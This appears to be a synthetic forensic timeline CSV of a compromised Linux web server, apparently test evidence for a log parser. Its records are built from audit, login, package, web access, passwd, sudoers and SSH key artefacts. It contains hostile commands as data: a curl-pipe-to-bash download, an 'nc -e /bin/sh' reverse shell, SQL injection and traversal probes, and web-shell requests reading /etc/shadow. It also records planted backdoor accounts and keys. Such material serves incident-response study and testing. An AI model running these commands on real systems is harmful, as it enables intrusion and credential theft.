datetime_utc,date,time,source,event_type,user,host,description,metadata,raw
2024-09-12T03:51:00.456000+00:00,2024-09-12,03:51:00,audit.log,audit_execve,,,EXECVE: /bin/bash -c curl -s http://198.51.100.7/x.sh | bash,"{""audit_type"": ""EXECVE"", ""type"": ""EXECVE"", ""msg"": ""audit(1726113060.456:200):"", ""argc"": ""3"", ""a0"": ""/bin/bash"", ""a1"": ""-c"", ""a2"": ""curl -s http://198.51.100.7/x.sh | bash""}","type=EXECVE msg=audit(1726113060.456:200): argc=3 a0=""/bin/bash"" a1=""-c"" a2=""curl -s http://198.51.100.7/x.sh | bash"""
2024-09-12T03:52:00.789000+00:00,2024-09-12,03:52:00,audit.log,audit_execve,,,EXECVE: nc -e /bin/sh 198.51.100.7,"{""audit_type"": ""EXECVE"", ""type"": ""EXECVE"", ""msg"": ""audit(1726113120.789:201):"", ""argc"": ""4"", ""a0"": ""nc"", ""a1"": ""-e"", ""a2"": ""/bin/sh"", ""a3"": ""198.51.100.7""}","type=EXECVE msg=audit(1726113120.789:201): argc=4 a0=""nc"" a1=""-e"" a2=""/bin/sh"" a3=""198.51.100.7"""
2024-09-12T03:53:20.111000+00:00,2024-09-12,03:53:20,audit.log,audit_avc,,,AVC denied: sshd -> unconfined_u:object_r:user_home_t:s0 (system_u:system_r:sshd_t:s0-s0:c0.c1023),"{""audit_type"": ""AVC"", ""type"": ""AVC"", ""msg"": ""audit(1726113200.111:300):"", ""pid"": ""2222"", ""comm"": ""sshd"", ""name"": ""badbin"", ""dev"": ""dm-0"", ""ino"": ""12345"", ""scontext"": ""system_u:system_r:sshd_t:s0-s0:c0.c1023"", ""tcontext"": ""unconfined_u:object_r:user_home_t:s0"", ""tclass"": ""file""}","type=AVC msg=audit(1726113200.111:300): avc:  denied  { execute } for  pid=2222 comm=""sshd"" name=""badbin"" dev=""dm-0"" ino=12345 scontext=system_u:system_r:sshd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:user_home_t:s0 tclass=file"
2024-09-12T03:55:00+00:00,2024-09-12,03:55:00,audit.log,audit_anom_promiscuous,0,,ANOM_PROMISCUOUS type=ANOM_PROMISCUOUS msg=audit(1726113300.000:400): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0,"{""audit_type"": ""ANOM_PROMISCUOUS"", ""type"": ""ANOM_PROMISCUOUS"", ""msg"": ""audit(1726113300.000:400):"", ""dev"": ""eth0"", ""prom"": ""256"", ""old_prom"": ""0"", ""auid"": ""0"", ""uid"": ""0"", ""gid"": ""0"", ""ses"": ""4""}",type=ANOM_PROMISCUOUS msg=audit(1726113300.000:400): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0 ses=4
2024-09-12T03:56:40.222000+00:00,2024-09-12,03:56:40,audit.log,audit_user_auth,0,,USER_AUTH acct=? res=? addr=- terminal=-,"{""audit_type"": ""USER_AUTH"", ""type"": ""USER_AUTH"", ""msg"": ""op=PAM:authentication acct=\""bob\"" exe=\""/usr/bin/sudo\"" hostname=? addr=? terminal=pts/1 res=failed"", ""pid"": ""3333"", ""uid"": ""0"", ""auid"": ""1001"", ""ses"": ""6""}","type=USER_AUTH msg=audit(1726113400.222:500): pid=3333 uid=0 auid=1001 ses=6 msg='op=PAM:authentication acct=""bob"" exe=""/usr/bin/sudo"" hostname=? addr=? terminal=pts/1 res=failed'"
2024-09-12T03:58:20+00:00,2024-09-12,03:58:20,wtmp,session_open,www-data,198.51.100.99,wtmp: type=USER_PROCESS user=www-data line=pts/3 host=198.51.100.99,"{""type"": ""USER_PROCESS"", ""pid"": 9002, ""line"": ""pts/3"", ""host"": ""198.51.100.99"", ""session"": 0}",
2024-09-12T03:58:20+00:00,2024-09-12,03:58:20,utmp,session_open,www-data,198.51.100.99,utmp: type=USER_PROCESS user=www-data line=pts/3 host=198.51.100.99,"{""type"": ""USER_PROCESS"", ""pid"": 9002, ""line"": ""pts/3"", ""host"": ""198.51.100.99"", ""session"": 0}",
2024-09-12T03:58:20+00:00,2024-09-12,03:58:20,lastlog,last_login,www-data,198.51.100.99,lastlog: user=www-data (uid=33) line=pts/3 host=198.51.100.99,"{""uid"": 33, ""line"": ""pts/3"", ""host"": ""198.51.100.99""}",
2024-09-12T04:00:00+00:00,2024-09-12,04:00:00,.bash_history,shell_command,claude,,claude: ls -la,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",ls -la
2024-09-12T04:00:10+00:00,2024-09-12,04:00:10,.bash_history,shell_command,claude,,claude: cd ~/projects,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",cd ~/projects
2024-09-12T04:01:40+00:00,2024-09-12,04:01:40,.bash_history,shell_command,claude,,claude: git pull,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",git pull
2024-09-12T04:03:20+00:00,2024-09-12,04:03:20,.bash_history,shell_command,claude,,claude: sudo apt update,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",sudo apt update
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,wtmp,session_open,alice,192.0.2.10,wtmp: type=USER_PROCESS user=alice line=pts/0 host=192.0.2.10,"{""type"": ""USER_PROCESS"", ""pid"": 9001, ""line"": ""pts/0"", ""host"": ""192.0.2.10"", ""session"": 0}",
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,utmp,session_open,alice,192.0.2.10,utmp: type=USER_PROCESS user=alice line=pts/0 host=192.0.2.10,"{""type"": ""USER_PROCESS"", ""pid"": 9001, ""line"": ""pts/0"", ""host"": ""192.0.2.10"", ""session"": 0}",
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,lastlog,last_login,alice,192.0.2.10,lastlog: user=alice (uid=1000) line=pts/1 host=192.0.2.10,"{""uid"": 1000, ""line"": ""pts/1"", ""host"": ""192.0.2.10""}",
2024-09-12T04:05:00+00:00,2024-09-12,04:05:00,.bash_history,shell_command,claude,,claude: sudo apt install nginx,"{""history_file"": ""/home/claude/test_evidence/home/alice/.bash_history""}",sudo apt install nginx
2025-09-12T03:00:11+00:00,2025-09-12,03:00:11,apt/history.log,package_install,alice,,apt install: nginx (cmd=apt-get install nginx),"{""package"": ""nginx"", ""action"": ""install"", ""command"": ""apt-get install nginx"", ""user"": ""alice""}",2025-09-12  03:00:11  Install: nginx:amd64 (1.18.0-6ubuntu14.4)
2025-09-12T03:00:12+00:00,2025-09-12,03:00:12,dpkg.log,package_install,,,dpkg install: nginx (<none> -> 1.18.0-6ubuntu14.4),"{""package"": ""nginx"", ""action"": ""install"", ""old"": ""<none>"", ""new"": ""1.18.0-6ubuntu14.4""}",2025-09-12 03:00:12 install nginx:amd64 <none> 1.18.0-6ubuntu14.4
2025-09-12T03:00:14+00:00,2025-09-12,03:00:14,dpkg.log,package_status,,,dpkg status: half-installed (nginx:amd64 -> 1.18.0-6ubuntu14.4),"{""package"": ""half-installed"", ""action"": ""status"", ""old"": ""nginx:amd64"", ""new"": ""1.18.0-6ubuntu14.4""}",2025-09-12 03:00:14 status half-installed nginx:amd64 1.18.0-6ubuntu14.4
2025-09-12T03:00:15+00:00,2025-09-12,03:00:15,dpkg.log,package_status,,,dpkg status: installed (nginx:amd64 -> 1.18.0-6ubuntu14.4),"{""package"": ""installed"", ""action"": ""status"", ""old"": ""nginx:amd64"", ""new"": ""1.18.0-6ubuntu14.4""}",2025-09-12 03:00:15 status installed nginx:amd64 1.18.0-6ubuntu14.4
2025-09-12T03:14:01+00:00,2025-09-12,03:14:01,web_access,http_request,,,"203.0.113.10 ""GET / HTTP/1.1"" 200 ua=""Mozilla/5.0 (X11; Linux x86_64)""","{""ip"": ""203.0.113.10"", ""request"": ""GET / HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0 (X11; Linux x86_64)"", ""size"": ""1543"", ""referer"": ""-""}","203.0.113.10 - - [12/Sep/2025:03:14:01 +0000] ""GET / HTTP/1.1"" 200 1543 ""-"" ""Mozilla/5.0 (X11; Linux x86_64)"""
2025-09-12T03:14:05+00:00,2025-09-12,03:14:05,web_access,http_request,,,"203.0.113.10 ""GET /favicon.ico HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""203.0.113.10"", ""request"": ""GET /favicon.ico HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""318"", ""referer"": ""-""}","203.0.113.10 - - [12/Sep/2025:03:14:05 +0000] ""GET /favicon.ico HTTP/1.1"" 200 318 ""-"" ""Mozilla/5.0"""
2025-09-12T04:00:01+00:00,2025-09-12,04:00:01,web_access,http_request,,,"198.51.100.55 ""GET / HTTP/1.1"" 200 ua=""sqlmap/1.7.2#stable (https://sqlmap.org)""","{""ip"": ""198.51.100.55"", ""request"": ""GET / HTTP/1.1"", ""status"": 200, ""user_agent"": ""sqlmap/1.7.2#stable (https://sqlmap.org)"", ""size"": ""1543"", ""referer"": ""-""}","198.51.100.55 - - [12/Sep/2025:04:00:01 +0000] ""GET / HTTP/1.1"" 200 1543 ""-"" ""sqlmap/1.7.2#stable (https://sqlmap.org)"""
2025-09-12T04:00:02+00:00,2025-09-12,04:00:02,web_access,http_request,,,"198.51.100.55 ""GET /index.php?id=1' HTTP/1.1"" 500 ua=""sqlmap/1.7.2#stable""","{""ip"": ""198.51.100.55"", ""request"": ""GET /index.php?id=1' HTTP/1.1"", ""status"": 500, ""user_agent"": ""sqlmap/1.7.2#stable"", ""size"": ""245"", ""referer"": ""-""}","198.51.100.55 - - [12/Sep/2025:04:00:02 +0000] ""GET /index.php?id=1' HTTP/1.1"" 500 245 ""-"" ""sqlmap/1.7.2#stable"""
2025-09-12T04:00:03+00:00,2025-09-12,04:00:03,web_access,http_request,,,"198.51.100.55 ""GET /admin/../../etc/passwd HTTP/1.1"" 404 ua=""sqlmap/1.7.2#stable""","{""ip"": ""198.51.100.55"", ""request"": ""GET /admin/../../etc/passwd HTTP/1.1"", ""status"": 404, ""user_agent"": ""sqlmap/1.7.2#stable"", ""size"": ""162"", ""referer"": ""-""}","198.51.100.55 - - [12/Sep/2025:04:00:03 +0000] ""GET /admin/../../etc/passwd HTTP/1.1"" 404 162 ""-"" ""sqlmap/1.7.2#stable"""
2025-09-12T04:30:11+00:00,2025-09-12,04:30:11,web_access,http_request,,,"198.51.100.99 ""GET /uploads/wso.php?cmd=id HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""198.51.100.99"", ""request"": ""GET /uploads/wso.php?cmd=id HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""543"", ""referer"": ""-""}","198.51.100.99 - - [12/Sep/2025:04:30:11 +0000] ""GET /uploads/wso.php?cmd=id HTTP/1.1"" 200 543 ""-"" ""Mozilla/5.0"""
2025-09-12T04:30:15+00:00,2025-09-12,04:30:15,web_access,http_request,,,"198.51.100.99 ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""198.51.100.99"", ""request"": ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""19"", ""referer"": ""-""}","198.51.100.99 - - [12/Sep/2025:04:30:15 +0000] ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"" 200 19 ""-"" ""Mozilla/5.0"""
2025-09-12T04:30:20+00:00,2025-09-12,04:30:20,apt/history.log,package_remove,alice,,apt remove: auditd (cmd=apt-get remove auditd fail2ban),"{""package"": ""auditd"", ""action"": ""remove"", ""command"": ""apt-get remove auditd fail2ban"", ""user"": ""alice""}",2025-09-12  04:30:20  Remove: auditd:amd64 (1:3.0.7-1build1)
2025-09-12T04:30:20+00:00,2025-09-12,04:30:20,apt/history.log,package_remove,alice,,apt remove: fail2ban (cmd=apt-get remove auditd fail2ban),"{""package"": ""fail2ban"", ""action"": ""remove"", ""command"": ""apt-get remove auditd fail2ban"", ""user"": ""alice""}",2025-09-12  04:30:20  Remove: fail2ban:all (0.11.2-6)
2025-09-12T04:30:21+00:00,2025-09-12,04:30:21,dpkg.log,package_remove,,,dpkg remove: auditd (1:3.0.7-1build1 -> <none>),"{""package"": ""auditd"", ""action"": ""remove"", ""old"": ""1:3.0.7-1build1"", ""new"": ""<none>""}",2025-09-12 04:30:21 remove auditd:amd64 1:3.0.7-1build1 <none>
2025-09-12T04:30:22+00:00,2025-09-12,04:30:22,dpkg.log,package_status,,,dpkg status: config-files (auditd:amd64 -> 1:3.0.7-1build1),"{""package"": ""config-files"", ""action"": ""status"", ""old"": ""auditd:amd64"", ""new"": ""1:3.0.7-1build1""}",2025-09-12 04:30:22 status config-files auditd:amd64 1:3.0.7-1build1
2025-09-12T04:30:30+00:00,2025-09-12,04:30:30,dpkg.log,package_remove,,,dpkg remove: fail2ban (0.11.2-6 -> <none>),"{""package"": ""fail2ban"", ""action"": ""remove"", ""old"": ""0.11.2-6"", ""new"": ""<none>""}",2025-09-12 04:30:30 remove fail2ban:all 0.11.2-6 <none>
2025-09-12T04:30:30+00:00,2025-09-12,04:30:30,web_access,http_request,,,"198.51.100.99 ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"" 200 ua=""Mozilla/5.0""","{""ip"": ""198.51.100.99"", ""request"": ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"", ""status"": 200, ""user_agent"": ""Mozilla/5.0"", ""size"": ""1029"", ""referer"": ""-""}","198.51.100.99 - - [12/Sep/2025:04:30:30 +0000] ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"" 200 1029 ""-"" ""Mozilla/5.0"""
2025-09-12T04:30:31+00:00,2025-09-12,04:30:31,dpkg.log,package_status,,,dpkg status: not-installed (fail2ban:all -> <none>),"{""package"": ""not-installed"", ""action"": ""status"", ""old"": ""fail2ban:all"", ""new"": ""<none>""}",2025-09-12 04:30:31 status not-installed fail2ban:all <none>
2025-09-12T05:00:01+00:00,2025-09-12,05:00:01,web_access,http_request,,,"192.0.2.222 ""GET /admin HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /admin HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:01 +0000] ""GET /admin HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:00:02+00:00,2025-09-12,05:00:02,web_access,http_request,,,"192.0.2.222 ""GET /backup HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /backup HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:02 +0000] ""GET /backup HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:00:03+00:00,2025-09-12,05:00:03,web_access,http_request,,,"192.0.2.222 ""GET /wp-admin HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /wp-admin HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:03 +0000] ""GET /wp-admin HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:00:04+00:00,2025-09-12,05:00:04,web_access,http_request,,,"192.0.2.222 ""GET /phpmyadmin HTTP/1.1"" 404 ua=""Mozilla/5.0""","{""ip"": ""192.0.2.222"", ""request"": ""GET /phpmyadmin HTTP/1.1"", ""status"": 404, ""user_agent"": ""Mozilla/5.0"", ""size"": ""245"", ""referer"": ""-""}","192.0.2.222 - - [12/Sep/2025:05:00:04 +0000] ""GET /phpmyadmin HTTP/1.1"" 404 245 ""-"" ""Mozilla/5.0"""
2025-09-12T05:15:00+00:00,2025-09-12,05:15:00,dpkg.log,package_install,,,dpkg install: netcat-traditional (<none> -> 1.10-47),"{""package"": ""netcat-traditional"", ""action"": ""install"", ""old"": ""<none>"", ""new"": ""1.10-47""}",2025-09-12 05:15:00 install netcat-traditional:amd64 <none> 1.10-47
2025-09-12T05:15:01+00:00,2025-09-12,05:15:01,dpkg.log,package_status,,,dpkg status: installed (netcat-traditional:amd64 -> 1.10-47),"{""package"": ""installed"", ""action"": ""status"", ""old"": ""netcat-traditional:amd64"", ""new"": ""1.10-47""}",2025-09-12 05:15:01 status installed netcat-traditional:amd64 1.10-47
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,/etc/hosts: 127.0.0.1 -> localhost,"{""ip"": ""127.0.0.1"", ""names"": [""localhost""]}",127.0.0.1 localhost
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,"/etc/hosts: ::1 -> localhost, ip6-localhost, ip6-loopback","{""ip"": ""::1"", ""names"": [""localhost"", ""ip6-localhost"", ""ip6-loopback""]}",::1 localhost ip6-localhost ip6-loopback
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,"/etc/hosts: 127.0.1.1 -> web01.example.com, web01","{""ip"": ""127.0.1.1"", ""names"": [""web01.example.com"", ""web01""]}",127.0.1.1 web01.example.com web01
2026-04-27T10:54:25+00:00,2026-04-27,10:54:25,/etc/hosts,hosts_entry,,,/etc/hosts: 185.199.108.133 -> github.com,"{""ip"": ""185.199.108.133"", ""names"": [""github.com""]}",185.199.108.133 github.com
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,root,,User present: root uid=0 shell=/bin/bash home=/root,"{""uid"": 0, ""gid"": 0, ""shell"": ""/bin/bash"", ""home"": ""/root""}",root:x:0:0:root:/root:/bin/bash
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,daemon,,User present: daemon uid=1 shell=/usr/sbin/nologin home=/usr/sbin,"{""uid"": 1, ""gid"": 1, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/usr/sbin""}",daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,bin,,User present: bin uid=2 shell=/usr/sbin/nologin home=/bin,"{""uid"": 2, ""gid"": 2, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/bin""}",bin:x:2:2:bin:/bin:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,sys,,User present: sys uid=3 shell=/usr/sbin/nologin home=/dev,"{""uid"": 3, ""gid"": 3, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/dev""}",sys:x:3:3:sys:/dev:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,www-data,,User present: www-data uid=33 shell=/bin/bash home=/var/www,"{""uid"": 33, ""gid"": 33, ""shell"": ""/bin/bash"", ""home"": ""/var/www""}",www-data:x:33:33:www-data:/var/www:/bin/bash
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,nobody,,User present: nobody uid=65534 shell=/usr/sbin/nologin home=/nonexistent,"{""uid"": 65534, ""gid"": 65534, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/nonexistent""}",nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,alice,,User present: alice uid=1000 shell=/bin/bash home=/home/alice,"{""uid"": 1000, ""gid"": 1000, ""shell"": ""/bin/bash"", ""home"": ""/home/alice""}","alice:x:1000:1000:Alice,,,:/home/alice:/bin/bash"
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,bob,,User present: bob uid=1001 shell=/bin/bash home=/home/bob,"{""uid"": 1001, ""gid"": 1001, ""shell"": ""/bin/bash"", ""home"": ""/home/bob""}","bob:x:1001:1001:Bob,,,:/home/bob:/bin/bash"
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,sshd,,User present: sshd uid=110 shell=/usr/sbin/nologin home=/run/sshd,"{""uid"": 110, ""gid"": 65534, ""shell"": ""/usr/sbin/nologin"", ""home"": ""/run/sshd""}",sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,mysql,,User present: mysql uid=111 shell=/bin/false home=/nonexistent,"{""uid"": 111, ""gid"": 120, ""shell"": ""/bin/false"", ""home"": ""/nonexistent""}",mysql:x:111:120:MySQL:/nonexistent:/bin/false
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,backup,,User present: backup uid=34 shell=/bin/bash home=/var/backups,"{""uid"": 34, ""gid"": 34, ""shell"": ""/bin/bash"", ""home"": ""/var/backups""}",backup:x:34:34:backup:/var/backups:/bin/bash
2026-04-27T10:54:32+00:00,2026-04-27,10:54:32,passwd,account_present,toor,,User present: toor uid=0 shell=/bin/bash home=/root,"{""uid"": 0, ""gid"": 0, ""shell"": ""/bin/bash"", ""home"": ""/root""}",toor:x:0:0:root backup:/root:/bin/bash
2026-04-27T10:55:06+00:00,2026-04-27,10:55:06,sshd_config,config_loaded,,,sshd_config parsed: /home/claude/test_evidence/etc/ssh/sshd_config,"{""directives"": {""port"": ""22"", ""permitrootlogin"": ""yes"", ""permitemptypasswords"": ""no"", ""passwordauthentication"": ""yes"", ""pubkeyauthentication"": ""yes"", ""challengeresponseauthentication"": ""no"", ""usepam"": ""yes"", ""printmotd"": ""no"", ""acceptenv"": ""lang lc_*"", ""subsystem"": ""sftp /usr/lib/openssh/sftp-server""}}",
2026-04-27T10:55:11+00:00,2026-04-27,10:55:11,authorized_keys,ssh_key_present,claude,,authorized_keys entry: user=claude type=ssh-rsa comment=attacker@evil,"{""user"": ""claude"", ""options"": ""command=\""/usr/local/bin/.x/run.sh\"",no-pty,no-X11-forwarding"", ""type"": ""ssh-rsa"", ""comment"": ""attacker@evil"", ""fingerprint_b64_prefix"": ""AAAAB3NzaC1yc2EAAAA..."", ""file"": ""/home/claude/test_evidence/root/.ssh/authorized_keys""}",
2026-04-27T10:55:11+00:00,2026-04-27,10:55:11,authorized_keys,ssh_key_present,claude,,authorized_keys entry: user=claude type=ssh-ed25519 comment=admin@laptop,"{""user"": ""claude"", ""options"": """", ""type"": ""ssh-ed25519"", ""comment"": ""admin@laptop"", ""fingerprint_b64_prefix"": ""AAAAC3NzaC1lZDI1NTE5AAAA"", ""file"": ""/home/claude/test_evidence/root/.ssh/authorized_keys""}",
2026-04-27T10:55:14+00:00,2026-04-27,10:55:14,authorized_keys,ssh_key_present,claude,,authorized_keys entry: user=claude type=ssh-ed25519 comment=alice@laptop,"{""user"": ""claude"", ""options"": """", ""type"": ""ssh-ed25519"", ""comment"": ""alice@laptop"", ""fingerprint_b64_prefix"": ""AAAAC3NzaC1lZDI1NTE5AAAA"", ""file"": ""/home/claude/test_evidence/home/alice/.ssh/authorized_keys""}",
2026-04-27T10:55:18+00:00,2026-04-27,10:55:18,sudoers,sudo_rule,,,sudo rule: alice ALL=(ALL) NOPASSWD:ALL,"{""who"": ""alice"", ""host"": ""ALL"", ""runas"": ""ALL"", ""tags"": ""NOPASSWD:"", ""commands"": ""ALL"", ""file"": ""/home/claude/test_evidence/etc/sudoers.d/90-custom""}",alice ALL=(ALL) NOPASSWD: ALL
2026-04-27T10:55:18+00:00,2026-04-27,10:55:18,sudoers,sudo_rule,,,sudo rule: www-data ALL=(ALL) NOPASSWD:/usr/bin/visudo,"{""who"": ""www-data"", ""host"": ""ALL"", ""runas"": ""ALL"", ""tags"": ""NOPASSWD:"", ""commands"": ""/usr/bin/visudo"", ""file"": ""/home/claude/test_evidence/etc/sudoers.d/90-custom""}",www-data ALL=(ALL) NOPASSWD: /usr/bin/visudo
